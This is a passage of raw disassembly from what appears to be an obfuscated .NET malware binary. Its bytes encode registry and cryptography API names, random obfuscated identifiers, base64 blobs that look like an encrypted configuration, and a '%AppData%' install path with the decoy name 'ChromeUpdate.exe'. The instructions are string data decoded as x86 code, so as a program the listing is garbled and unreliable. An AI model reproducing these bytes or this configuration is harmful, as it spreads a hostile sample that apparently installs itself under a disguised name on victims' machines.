  40997b:	4b                   	dec    %ebx
  40997c:	42                   	inc    %edx
  40997d:	74 59                	je     0x4099d8
  40997f:	79 00                	jns    0x409981
  409981:	6d                   	insl   (%dx),%es:(%edi)
  409982:	6c                   	insb   (%dx),%es:(%edi)
  409983:	47                   	inc    %edi
  409984:	77 70                	ja     0x4099f6
  409986:	48                   	dec    %eax
  409987:	63 78 67             	arpl   %edi,0x67(%eax)
  40998a:	46                   	inc    %esi
  40998b:	75 78                	jne    0x409a05
  40998d:	59                   	pop    %ecx
  40998e:	79 00                	jns    0x409990
  409990:	6e                   	outsb  %ds:(%esi),(%dx)
  409991:	4f                   	dec    %edi
  409992:	6b 71 69 4c          	imul   $0x4c,0x69(%ecx),%esi
  409996:	5a                   	pop    %edx
  409997:	4b                   	dec    %ebx
  409998:	79 5a                	jns    0x4099f4
  40999a:	79 00                	jns    0x40999c
  40999c:	49                   	dec    %ecx
  40999d:	6e                   	outsb  %ds:(%esi),(%dx)
  40999e:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  4099a5:	65 
  4099a6:	41                   	inc    %ecx
  4099a7:	72 72                	jb     0x409a1b
  4099a9:	61                   	popa
  4099aa:	79 00                	jns    0x4099ac
  4099ac:	54                   	push   %esp
  4099ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4099ae:	41                   	inc    %ecx
  4099af:	72 72                	jb     0x409a23
  4099b1:	61                   	popa
  4099b2:	79 00                	jns    0x4099b4
  4099b4:	67 65 74 5f          	addr16 gs je 0x409a17
  4099b8:	41                   	inc    %ecx
  4099b9:	73 41                	jae    0x4099fc
  4099bb:	72 72                	jb     0x409a2f
  4099bd:	61                   	popa
  4099be:	79 00                	jns    0x4099c0
  4099c0:	67 65 74 5f          	addr16 gs je 0x409a23
  4099c4:	4b                   	dec    %ebx
  4099c5:	65 79 00             	gs jns 0x4099c8
  4099c8:	73 65                	jae    0x409a2f
  4099ca:	74 5f                	je     0x409a2b
  4099cc:	4b                   	dec    %ebx
  4099cd:	65 79 00             	gs jns 0x4099d0
  4099d0:	43                   	inc    %ebx
  4099d1:	72 65                	jb     0x409a38
  4099d3:	61                   	popa
  4099d4:	74 65                	je     0x409a3b
  4099d6:	53                   	push   %ebx
  4099d7:	75 62                	jne    0x409a3b
  4099d9:	4b                   	dec    %ebx
  4099da:	65 79 00             	gs jns 0x4099dd
  4099dd:	4f                   	dec    %edi
  4099de:	70 65                	jo     0x409a45
  4099e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4099e1:	53                   	push   %ebx
  4099e2:	75 62                	jne    0x409a46
  4099e4:	4b                   	dec    %ebx
  4099e5:	65 79 00             	gs jns 0x4099e8
  4099e8:	67 65 74 5f          	addr16 gs je 0x409a4b
  4099ec:	50                   	push   %eax
  4099ed:	75 62                	jne    0x409a51
  4099ef:	6c                   	insb   (%dx),%es:(%edi)
  4099f0:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  4099f7:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  4099fe:	4b 65 
  409a00:	79 00                	jns    0x409a02
  409a02:	53                   	push   %ebx
  409a03:	79 73                	jns    0x409a78
  409a05:	74 65                	je     0x409a6c
  409a07:	6d                   	insl   (%dx),%es:(%edi)
  409a08:	2e 53                	cs push %ebx
  409a0a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409a0e:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409a15:	70 
  409a16:	74 6f                	je     0x409a87
  409a18:	67 72 61             	addr16 jb 0x409a7c
  409a1b:	70 68                	jo     0x409a85
  409a1d:	79 00                	jns    0x409a1f
  409a1f:	41                   	inc    %ecx
  409a20:	73 73                	jae    0x409a95
  409a22:	65 6d                	gs insl (%dx),%es:(%edi)
  409a24:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409a28:	41                   	inc    %ecx
  409a29:	64 64 72 65          	fs fs jb 0x409a92
  409a2d:	73 73                	jae    0x409aa2
  409a2f:	46                   	inc    %esi
  409a30:	61                   	popa
  409a31:	6d                   	insl   (%dx),%es:(%edi)
  409a32:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409a39:	63 
  409a3a:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409a3e:	79 00                	jns    0x409a40
  409a40:	54                   	push   %esp
  409a41:	6f                   	outsl  %ds:(%esi),(%dx)
  409a42:	42                   	inc    %edx
  409a43:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409a4a:	65 74 5f             	gs je  0x409aac
  409a4d:	53                   	push   %ebx
  409a4e:	79 73                	jns    0x409ac3
  409a50:	74 65                	je     0x409ab7
  409a52:	6d                   	insl   (%dx),%es:(%edi)
  409a53:	44                   	inc    %esp
  409a54:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409a5b:	79 00                	jns    0x409a5d
  409a5d:	52                   	push   %edx
  409a5e:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409a65:	00 6f 
  409a67:	70 5f                	jo     0x409ac8
  409a69:	45                   	inc    %ebp
  409a6a:	71 75                	jno    0x409ae1
  409a6c:	61                   	popa
  409a6d:	6c                   	insb   (%dx),%es:(%edi)
  409a6e:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409a75:	49 
  409a76:	6e                   	outsb  %ds:(%esi),(%dx)
  409a77:	65 71 75             	gs jno 0x409aef
  409a7a:	61                   	popa
  409a7b:	6c                   	insb   (%dx),%es:(%edi)
  409a7c:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409a83:	74 
  409a84:	65 6d                	gs insl (%dx),%es:(%edi)
  409a86:	2e 4e                	cs dec %esi
  409a88:	65 74 2e             	gs je  0x409ab9
  409a8b:	53                   	push   %ebx
  409a8c:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409a90:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409a97:	64 
  409a98:	6f                   	outsl  %ds:(%esi),(%dx)
  409a99:	77 73                	ja     0x409b0e
  409a9b:	49                   	dec    %ecx
  409a9c:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409a9f:	74 69                	je     0x409b0a
  409aa1:	74 79                	je     0x409b1c
  409aa3:	00 49 73             	add    %cl,0x73(%ecx)
  409aa6:	4e                   	dec    %esi
  409aa7:	75 6c                	jne    0x409b15
  409aa9:	6c                   	insb   (%dx),%es:(%edi)
  409aaa:	4f                   	dec    %edi
  409aab:	72 45                	jb     0x409af2
  409aad:	6d                   	insl   (%dx),%es:(%edi)
  409aae:	70 74                	jo     0x409b24
  409ab0:	79 00                	jns    0x409ab2
  409ab2:	4c                   	dec    %esp
  409ab3:	43                   	inc    %ebx
  409ab4:	75 56                	jne    0x409b0c
  409ab6:	71 4e                	jno    0x409b06
  409ab8:	49                   	dec    %ecx
  409ab9:	4e                   	dec    %esi
  409aba:	72 4e                	jb     0x409b0a
  409abc:	56                   	push   %esi
  409abd:	44                   	inc    %esp
  409abe:	76 79                	jbe    0x409b39
  409ac0:	00 42 69             	add    %al,0x69(%edx)
  409ac3:	78 57                	js     0x409b1c
  409ac5:	66 52                	push   %dx
  409ac7:	58                   	pop    %eax
  409ac8:	48                   	dec    %eax
  409ac9:	75 6b                	jne    0x409b36
  409acb:	71 45                	jno    0x409b12
  409acd:	47                   	inc    %edi
  409ace:	58                   	pop    %eax
  409acf:	7a 00                	jp     0x409ad1
  409ad1:	79 76                	jns    0x409b49
  409ad3:	62 42 70             	bound  %eax,0x70(%edx)
  409ad6:	51                   	push   %ecx
  409ad7:	50                   	push   %eax
  409ad8:	79 68                	jns    0x409b42
  409ada:	68 41 44 70 7a       	push   $0x7a704441
  409adf:	58                   	pop    %eax
  409ae0:	7a 00                	jp     0x409ae2
  409ae2:	72 61                	jb     0x409b45
  409ae4:	50                   	push   %eax
  409ae5:	6e                   	outsb  %ds:(%esi),(%dx)
  409ae6:	67 77 73             	addr16 ja 0x409b5c
  409ae9:	58                   	pop    %eax
  409aea:	61                   	popa
  409aeb:	6d                   	insl   (%dx),%es:(%edi)
  409aec:	69 6d 41 42 5a 7a 00 	imul   $0x7a5a42,0x41(%ebp),%ebp
  409af3:	69 48 69 65 69 4d 50 	imul   $0x504d6965,0x69(%eax),%ecx
  409afa:	4e                   	dec    %esi
  409afb:	44                   	inc    %esp
  409afc:	7a 6d                	jp     0x409b6b
  409afe:	5a                   	pop    %edx
  409aff:	6d                   	insl   (%dx),%es:(%edi)
  409b00:	68 7a 00 69 6c       	push   $0x6c69007a
  409b05:	43                   	inc    %ebx
  409b06:	64 56                	fs push %esi
  409b08:	68 52 75 74 73       	push   $0x73747552
  409b0d:	4d                   	dec    %ebp
  409b0e:	57                   	push   %edi
  409b0f:	6b 7a 00 44          	imul   $0x44,0x0(%edx),%edi
  409b13:	46                   	inc    %esi
  409b14:	74 63                	je     0x409b79
  409b16:	67 6b 62 48 6c       	imul   $0x6c,0x48(%bp,%si),%esp
  409b1b:	63 71 7a             	arpl   %esi,0x7a(%ecx)
  409b1e:	00 73 51             	add    %dh,0x51(%ebx)
  409b21:	73 4c                	jae    0x409b6f
  409b23:	42                   	inc    %edx
  409b24:	50                   	push   %eax
  409b25:	6d                   	insl   (%dx),%es:(%edi)
  409b26:	51                   	push   %ecx
  409b27:	70 76                	jo     0x409b9f
  409b29:	41                   	inc    %ecx
  409b2a:	43                   	inc    %ebx
  409b2b:	77 6d                	ja     0x409b9a
  409b2d:	74 7a                	je     0x409ba9
  409b2f:	00 6a 47             	add    %ch,0x47(%edx)
  409b32:	47                   	inc    %edi
  409b33:	6e                   	outsb  %ds:(%esi),(%dx)
  409b34:	43                   	inc    %ebx
  409b35:	6d                   	insl   (%dx),%es:(%edi)
  409b36:	56                   	push   %esi
  409b37:	61                   	popa
  409b38:	57                   	push   %edi
  409b39:	6e                   	outsb  %ds:(%esi),(%dx)
  409b3a:	76 61                	jbe    0x409b9d
  409b3c:	42                   	inc    %edx
  409b3d:	75 7a                	jne    0x409bb9
  409b3f:	00 46 49             	add    %al,0x49(%esi)
  409b42:	52                   	push   %edx
  409b43:	69 41 68 56 79 59 76 	imul   $0x76597956,0x68(%ecx),%eax
  409b4a:	48                   	dec    %eax
  409b4b:	76 7a                	jbe    0x409bc7
  409b4d:	00 00                	add    %al,(%eax)
  409b4f:	00 00                	add    %al,(%eax)
  409b51:	0d 53 00 48 00       	or     $0x480053,%eax
  409b56:	41                   	inc    %ecx
  409b57:	00 32                	add    %dh,(%edx)
  409b59:	00 35 00 36 00 00    	add    %dh,0x3600
  409b5f:	80 d9 39             	sbb    $0x39,%cl
  409b62:	00 34 00             	add    %dh,(%eax,%eax,1)
  409b65:	50                   	push   %eax
  409b66:	00 32                	add    %dh,(%edx)
  409b68:	00 41 00             	add    %al,0x0(%ecx)
  409b6b:	50                   	push   %eax
  409b6c:	00 36                	add    %dh,(%esi)
  409b6e:	00 6b 00             	add    %ch,0x0(%ebx)
  409b71:	4e                   	dec    %esi
  409b72:	00 2f                	add    %ch,(%edi)
  409b74:	00 47 00             	add    %al,0x0(%edi)
  409b77:	44                   	inc    %esp
  409b78:	00 59 00             	add    %bl,0x0(%ecx)
  409b7b:	64 00 31             	add    %dh,%fs:(%ecx)
  409b7e:	00 66 00             	add    %ah,0x0(%esi)
  409b81:	46                   	inc    %esi
  409b82:	00 61 00             	add    %ah,0x0(%ecx)
  409b85:	55                   	push   %ebp
  409b86:	00 33                	add    %dh,(%ebx)
  409b88:	00 41 00             	add    %al,0x0(%ecx)
  409b8b:	61                   	popa
  409b8c:	00 52 00             	add    %dl,0x0(%edx)
  409b8f:	7a 00                	jp     0x409b91
  409b91:	58                   	pop    %eax
  409b92:	00 4c 00 68          	add    %cl,0x68(%eax,%eax,1)
  409b96:	00 48 00             	add    %cl,0x0(%eax)
  409b99:	63 00                	arpl   %eax,(%eax)
  409b9b:	71 00                	jno    0x409b9d
  409b9d:	45                   	inc    %ebp
  409b9e:	00 78 00             	add    %bh,0x0(%eax)
  409ba1:	48                   	dec    %eax
  409ba2:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  409ba6:	00 78 00             	add    %bh,0x0(%eax)
  409ba9:	69 00 4f 00 34 00    	imul   $0x34004f,(%eax),%eax
  409baf:	41                   	inc    %ecx
  409bb0:	00 4b 00             	add    %cl,0x0(%ebx)
  409bb3:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  409bb7:	41                   	inc    %ecx
  409bb8:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  409bbc:	00 63 00             	add    %ah,0x0(%ebx)
  409bbf:	72 00                	jb     0x409bc1
  409bc1:	33 00                	xor    (%eax),%eax
  409bc3:	50                   	push   %eax
  409bc4:	00 4b 00             	add    %cl,0x0(%ebx)
  409bc7:	62 00                	bound  %eax,(%eax)
  409bc9:	37                   	aaa
  409bca:	00 32                	add    %dh,(%edx)
  409bcc:	00 34 00             	add    %dh,(%eax,%eax,1)
  409bcf:	57                   	push   %edi
  409bd0:	00 78 00             	add    %bh,0x0(%eax)
  409bd3:	4d                   	dec    %ebp
  409bd4:	00 63 00             	add    %ah,0x0(%ebx)
  409bd7:	58                   	pop    %eax
  409bd8:	00 6d 00             	add    %ch,0x0(%ebp)
  409bdb:	72 00                	jb     0x409bdd
  409bdd:	75 00                	jne    0x409bdf
  409bdf:	68 00 4c 00 46       	push   $0x46004c00
  409be4:	00 61 00             	add    %ah,0x0(%ecx)
  409be7:	68 00 66 00 6e       	push   $0x6e006600
  409bec:	00 78 00             	add    %bh,0x0(%eax)
  409bef:	31 00                	xor    %eax,(%eax)
  409bf1:	50                   	push   %eax
  409bf2:	00 77 00             	add    %dh,0x0(%edi)
  409bf5:	74 00                	je     0x409bf7
  409bf7:	74 00                	je     0x409bf9
  409bf9:	65 00 36             	add    %dh,%gs:(%esi)
  409bfc:	00 62 00             	add    %ah,0x0(%edx)
  409bff:	34 00                	xor    $0x0,%al
  409c01:	34 00                	xor    $0x0,%al
  409c03:	4d                   	dec    %ebp
  409c04:	00 58 00             	add    %bl,0x0(%eax)
  409c07:	55                   	push   %ebp
  409c08:	00 53 00             	add    %dl,0x0(%ebx)
  409c0b:	66 00 56 00          	data16 add %dl,0x0(%esi)
  409c0f:	5a                   	pop    %edx
  409c10:	00 72 00             	add    %dh,0x0(%edx)
  409c13:	49                   	dec    %ecx
  409c14:	00 77 00             	add    %dh,0x0(%edi)
  409c17:	6d                   	insl   (%dx),%es:(%edi)
  409c18:	00 56 00             	add    %dl,0x0(%esi)
  409c1b:	47                   	inc    %edi
  409c1c:	00 2f                	add    %ch,(%edi)
  409c1e:	00 76 00             	add    %dh,0x0(%esi)
  409c21:	4a                   	dec    %edx
  409c22:	00 46 00             	add    %al,0x0(%esi)
  409c25:	53                   	push   %ebx
  409c26:	00 6d 00             	add    %ch,0x0(%ebp)
  409c29:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  409c2d:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  409c31:	45                   	inc    %ebp
  409c32:	00 47 00             	add    %al,0x0(%edi)
  409c35:	34 00                	xor    $0x0,%al
  409c37:	3d 00 00 81 01       	cmp    $0x1810000,%eax
  409c3c:	54                   	push   %esp
  409c3d:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  409c41:	00 68 00             	add    %ch,0x0(%eax)
  409c44:	44                   	inc    %esp
  409c45:	00 66 00             	add    %ah,0x0(%esi)
  409c48:	6e                   	outsb  %ds:(%esi),(%dx)
  409c49:	00 4b 00             	add    %cl,0x0(%ebx)
  409c4c:	37                   	aaa
  409c4d:	00 52 00             	add    %dl,0x0(%edx)
  409c50:	66 00 45 00          	data16 add %al,0x0(%ebp)
  409c54:	30 00                	xor    %al,(%eax)
  409c56:	69 00 4d 00 36 00    	imul   $0x36004d,(%eax),%eax
  409c5c:	61                   	popa
  409c5d:	00 71 00             	add    %dh,0x0(%ecx)
  409c60:	71 00                	jno    0x409c62
  409c62:	4e                   	dec    %esi
  409c63:	00 53 00             	add    %dl,0x0(%ebx)
  409c66:	4c                   	dec    %esp
  409c67:	00 39                	add    %bh,(%ecx)
  409c69:	00 67 00             	add    %ah,0x0(%edi)
  409c6c:	75 00                	jne    0x409c6e
  409c6e:	59                   	pop    %ecx
  409c6f:	00 4f 00             	add    %cl,0x0(%edi)
  409c72:	32 00                	xor    (%eax),%al
  409c74:	48                   	dec    %eax
  409c75:	00 6b 00             	add    %ch,0x0(%ebx)
  409c78:	41                   	inc    %ecx
  409c79:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  409c7d:	00 73 00             	add    %dh,0x0(%ebx)
  409c80:	32 00                	xor    (%eax),%al
  409c82:	54                   	push   %esp
  409c83:	00 79 00             	add    %bh,0x0(%ecx)
  409c86:	64 00 38             	add    %bh,%fs:(%eax)
  409c89:	00 39                	add    %bh,(%ecx)
  409c8b:	00 56 00             	add    %dl,0x0(%esi)
  409c8e:	61                   	popa
  409c8f:	00 6a 00             	add    %ch,0x0(%edx)
  409c92:	77 00                	ja     0x409c94
  409c94:	72 00                	jb     0x409c96
  409c96:	72 00                	jb     0x409c98
  409c98:	55                   	push   %ebp
  409c99:	00 6a 00             	add    %ch,0x0(%edx)
  409c9c:	56                   	push   %esi
  409c9d:	00 73 00             	add    %dh,0x0(%ebx)
  409ca0:	71 00                	jno    0x409ca2
  409ca2:	69 00 77 00 31 00    	imul   $0x310077,(%eax),%eax
  409ca8:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  409cac:	68 00 6d 00 73       	push   $0x73006d00
  409cb1:	00 75 00             	add    %dh,0x0(%ebp)
  409cb4:	76 00                	jbe    0x409cb6
  409cb6:	54                   	push   %esp
  409cb7:	00 58 00             	add    %bl,0x0(%eax)
  409cba:	45                   	inc    %ebp
  409cbb:	00 43 00             	add    %al,0x0(%ebx)
  409cbe:	6b 00 78             	imul   $0x78,(%eax),%eax
  409cc1:	00 4a 00             	add    %cl,0x0(%edx)
  409cc4:	72 00                	jb     0x409cc6
  409cc6:	45                   	inc    %ebp
  409cc7:	00 66 00             	add    %ah,0x0(%esi)
  409cca:	70 00                	jo     0x409ccc
  409ccc:	4c                   	dec    %esp
  409ccd:	00 4f 00             	add    %cl,0x0(%edi)
  409cd0:	48                   	dec    %eax
  409cd1:	00 69 00             	add    %ch,0x0(%ecx)
  409cd4:	73 00                	jae    0x409cd6
  409cd6:	72 00                	jb     0x409cd8
  409cd8:	58                   	pop    %eax
  409cd9:	00 37                	add    %dh,(%edi)
  409cdb:	00 6a 00             	add    %ch,0x0(%edx)
  409cde:	79 00                	jns    0x409ce0
  409ce0:	39 00                	cmp    %eax,(%eax)
  409ce2:	6a 00                	push   $0x0
  409ce4:	7a 00                	jp     0x409ce6
  409ce6:	35 00 50 00 63       	xor    $0x63005000,%eax
  409ceb:	00 52 00             	add    %dl,0x0(%edx)
  409cee:	69 00 67 00 4c 00    	imul   $0x4c0067,(%eax),%eax
  409cf4:	36 00 47 00          	add    %al,%ss:0x0(%edi)
  409cf8:	68 00 55 00 66       	push   $0x66005500
  409cfd:	00 68 00             	add    %ch,0x0(%eax)
  409d00:	41                   	inc    %ecx
  409d01:	00 47 00             	add    %al,0x0(%edi)
  409d04:	54                   	push   %esp
  409d05:	00 32                	add    %dh,(%edx)
  409d07:	00 64 00 2b          	add    %ah,0x2b(%eax,%eax,1)
  409d0b:	00 71 00             	add    %dh,0x0(%ecx)
  409d0e:	58                   	pop    %eax
  409d0f:	00 51 00             	add    %dl,0x0(%ecx)
  409d12:	37                   	aaa
  409d13:	00 65 00             	add    %ah,0x0(%ebp)
  409d16:	57                   	push   %edi
  409d17:	00 76 00             	add    %dh,0x0(%esi)
  409d1a:	4f                   	dec    %edi
  409d1b:	00 49 00             	add    %cl,0x0(%ecx)
  409d1e:	72 00                	jb     0x409d20
  409d20:	51                   	push   %ecx
  409d21:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
  409d25:	00 33                	add    %dh,(%ebx)
  409d27:	00 4a 00             	add    %cl,0x0(%edx)
  409d2a:	32 00                	xor    (%eax),%al
  409d2c:	75 00                	jne    0x409d2e
  409d2e:	6b 00 58             	imul   $0x58,(%eax),%eax
  409d31:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  409d35:	00 55 00             	add    %dl,0x0(%ebp)
  409d38:	50                   	push   %eax
  409d39:	00 41 00             	add    %al,0x0(%ecx)
  409d3c:	00 80 b1 78 00 77    	add    %al,0x770078b1(%eax)
  409d42:	00 57 00             	add    %dl,0x0(%edi)
  409d45:	57                   	push   %edi
  409d46:	00 4c 00 77          	add    %cl,0x77(%eax,%eax,1)
  409d4a:	00 67 00             	add    %ah,0x0(%edi)
  409d4d:	6e                   	outsb  %ds:(%esi),(%dx)
  409d4e:	00 43 00             	add    %al,0x0(%ebx)
  409d51:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409d55:	6e                   	outsb  %ds:(%esi),(%dx)
  409d56:	00 6b 00             	add    %ch,0x0(%ebx)
  409d59:	79 00                	jns    0x409d5b
  409d5b:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  409d5f:	51                   	push   %ecx
  409d60:	00 76 00             	add    %dh,0x0(%esi)
  409d63:	79 00                	jns    0x409d65
  409d65:	45                   	inc    %ebp
  409d66:	00 36                	add    %dh,(%esi)
  409d68:	00 32                	add    %dh,(%edx)
  409d6a:	00 70 00             	add    %dh,0x0(%eax)
  409d6d:	4f                   	dec    %edi
  409d6e:	00 6b 00             	add    %ch,0x0(%ebx)
  409d71:	6e                   	outsb  %ds:(%esi),(%dx)
  409d72:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  409d76:	00 2f                	add    %ch,(%edi)
  409d78:	00 59 00             	add    %bl,0x0(%ecx)
  409d7b:	68 00 59 00 63       	push   $0x63005900
  409d80:	00 47 00             	add    %al,0x0(%edi)
  409d83:	47                   	inc    %edi
  409d84:	00 4a 00             	add    %cl,0x0(%edx)
  409d87:	50                   	push   %eax
  409d88:	00 33                	add    %dh,(%ebx)
  409d8a:	00 61 00             	add    %ah,0x0(%ecx)
  409d8d:	4f                   	dec    %edi
  409d8e:	00 6d 00             	add    %ch,0x0(%ebp)
  409d91:	71 00                	jno    0x409d93
  409d93:	59                   	pop    %ecx
  409d94:	00 70 00             	add    %dh,0x0(%eax)
  409d97:	4e                   	dec    %esi
  409d98:	00 50 00             	add    %dl,0x0(%eax)
  409d9b:	78 00                	js     0x409d9d
  409d9d:	39 00                	cmp    %eax,(%eax)
  409d9f:	4e                   	dec    %esi
  409da0:	00 4d 00             	add    %cl,0x0(%ebp)
  409da3:	44                   	inc    %esp
  409da4:	00 62 00             	add    %ah,0x0(%edx)
  409da7:	53                   	push   %ebx
  409da8:	00 6b 00             	add    %ch,0x0(%ebx)
  409dab:	37                   	aaa
  409dac:	00 48 00             	add    %cl,0x0(%eax)
  409daf:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  409db3:	58                   	pop    %eax
  409db4:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  409db8:	00 70 00             	add    %dh,0x0(%eax)
  409dbb:	44                   	inc    %esp
  409dbc:	00 56 00             	add    %dl,0x0(%esi)
  409dbf:	30 00                	xor    %al,(%eax)
  409dc1:	69 00 56 00 44 00    	imul   $0x440056,(%eax),%eax
  409dc7:	4c                   	dec    %esp
  409dc8:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  409dcc:	00 7a 00             	add    %bh,0x0(%edx)
  409dcf:	6d                   	insl   (%dx),%es:(%edi)
  409dd0:	00 30                	add    %dh,(%eax)
  409dd2:	00 57 00             	add    %dl,0x0(%edi)
  409dd5:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  409dd9:	45                   	inc    %ebp
  409dda:	00 57 00             	add    %dl,0x0(%edi)
  409ddd:	42                   	inc    %edx
  409dde:	00 76 00             	add    %dh,0x0(%esi)
  409de1:	34 00                	xor    $0x0,%al
  409de3:	61                   	popa
  409de4:	00 67 00             	add    %ah,0x0(%edi)
  409de7:	57                   	push   %edi
  409de8:	00 51 00             	add    %dl,0x0(%ecx)
  409deb:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409df0:	80 b1 65 00 74 00 4b 	xorb   $0x4b,0x740065(%ecx)
  409df7:	00 6b 00             	add    %ch,0x0(%ebx)
  409dfa:	79 00                	jns    0x409dfc
  409dfc:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  409e00:	45                   	inc    %ebp
  409e01:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  409e05:	00 30                	add    %dh,(%eax)
  409e07:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  409e0b:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  409e0f:	00 33                	add    %dh,(%ebx)
  409e11:	00 63 00             	add    %ah,0x0(%ebx)
  409e14:	5a                   	pop    %edx
  409e15:	00 4e 00             	add    %cl,0x0(%esi)
  409e18:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  409e1c:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
  409e20:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  409e24:	75 00                	jne    0x409e26
  409e26:	51                   	push   %ecx
  409e27:	00 64 00 56          	add    %ah,0x56(%eax,%eax,1)
  409e2b:	00 37                	add    %dh,(%edi)
  409e2d:	00 78 00             	add    %bh,0x0(%eax)
  409e30:	55                   	push   %ebp
  409e31:	00 58 00             	add    %bl,0x0(%eax)
  409e34:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  409e38:	6f                   	outsl  %ds:(%esi),(%dx)
  409e39:	00 2f                	add    %ch,(%edi)
  409e3b:	00 2b                	add    %ch,(%ebx)
  409e3d:	00 55 00             	add    %dl,0x0(%ebp)
  409e40:	35 00 71 00 6e       	xor    $0x6e007100,%eax
  409e45:	00 76 00             	add    %dh,0x0(%esi)
  409e48:	77 00                	ja     0x409e4a
  409e4a:	78 00                	js     0x409e4c
  409e4c:	61                   	popa
  409e4d:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
  409e51:	00 42 00             	add    %al,0x0(%edx)
  409e54:	34 00                	xor    $0x0,%al
  409e56:	63 00                	arpl   %eax,(%eax)
  409e58:	4d                   	dec    %ebp
  409e59:	00 6a 00             	add    %ch,0x0(%edx)
  409e5c:	35 00 70 00 72       	xor    $0x72007000,%eax
  409e61:	00 33                	add    %dh,(%ebx)
  409e63:	00 71 00             	add    %dh,0x0(%ecx)
  409e66:	76 00                	jbe    0x409e68
  409e68:	44                   	inc    %esp
  409e69:	00 4d 00             	add    %cl,0x0(%ebp)
  409e6c:	2b 00                	sub    (%eax),%eax
  409e6e:	2b 00                	sub    (%eax),%eax
  409e70:	58                   	pop    %eax
  409e71:	00 4e 00             	add    %cl,0x0(%esi)
  409e74:	6b 00 68             	imul   $0x68,(%eax),%eax
  409e77:	00 45 00             	add    %al,0x0(%ebp)
  409e7a:	73 00                	jae    0x409e7c
  409e7c:	41                   	inc    %ecx
  409e7d:	00 37                	add    %dh,(%edi)
  409e7f:	00 67 00             	add    %ah,0x0(%edi)
  409e82:	6c                   	insb   (%dx),%es:(%edi)
  409e83:	00 42 00             	add    %al,0x0(%edx)
  409e86:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  409e8a:	63 00                	arpl   %eax,(%eax)
  409e8c:	50                   	push   %eax
  409e8d:	00 39                	add    %bh,(%ecx)
  409e8f:	00 6b 00             	add    %ch,0x0(%ebx)
  409e92:	59                   	pop    %ecx
  409e93:	00 4f 00             	add    %cl,0x0(%edi)
  409e96:	30 00                	xor    %al,(%eax)
  409e98:	48                   	dec    %eax
  409e99:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  409e9d:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  409ea3:	13 25 00 41 00 70    	adc    0x70004100,%esp
  409ea9:	00 70 00             	add    %dh,0x0(%eax)
  409eac:	44                   	inc    %esp
  409ead:	00 61 00             	add    %ah,0x0(%ecx)
  409eb0:	74 00                	je     0x409eb2
  409eb2:	61                   	popa
  409eb3:	00 25 00 00 21 43    	add    %ah,0x43210000
  409eb9:	00 68 00             	add    %ch,0x0(%eax)
  409ebc:	72 00                	jb     0x409ebe
  409ebe:	6f                   	outsl  %ds:(%esi),(%dx)
  409ebf:	00 6d 00             	add    %ch,0x0(%ebp)
  409ec2:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  409ec6:	70 00                	jo     0x409ec8
  409ec8:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409ecc:	74 00                	je     0x409ece
  409ece:	65 00 2e             	add    %ch,%gs:(%esi)
  409ed1:	00 65 00             	add    %ah,0x0(%ebp)
  409ed4:	78 00                	js     0x409ed6
  409ed6:	65 00 00             	add    %al,%gs:(%eax)
  409ed9:	59                   	pop    %ecx
  409eda:	62 00                	bound  %eax,(%eax)
  409edc:	55                   	push   %ebp
  409edd:	00 34 00             	add    %dh,(%eax,%eax,1)
  409ee0:	77 00                	ja     0x409ee2
  409ee2:	62 00                	bound  %eax,(%eax)
  409ee4:	6d                   	insl   (%dx),%es:(%edi)
  409ee5:	00 56 00             	add    %dl,0x0(%esi)
  409ee8:	45                   	inc    %ebp
  409ee9:	00 52 00             	add    %dl,0x0(%edx)
